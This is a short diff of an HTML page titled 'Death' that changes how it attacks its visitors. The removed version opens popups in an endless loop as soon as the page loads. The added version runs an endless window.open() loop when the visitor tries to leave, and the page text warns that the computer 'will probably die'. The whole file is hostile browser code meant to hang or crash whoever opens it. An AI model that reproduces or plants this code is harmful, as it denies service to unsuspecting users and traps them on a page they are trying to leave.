@@ -3,11 +3,12 @@
 	<head>
 	  <title>Death</title>
 		<script type="text/javascript">
-		  function death () {while(true){window.open('http://xornob.github.io/kc','_blank');};};
-		  death();
+		  window.onbeforeunload = function () {
+		  	while(1)window.open();
+		  }
 		</script>
 	</head>
 	<body>
-		<p>Enjoy Death! (allow popups)</p>
+		<p>If you leave this page, your computer will probably die</p>
 	</body>
 </html>
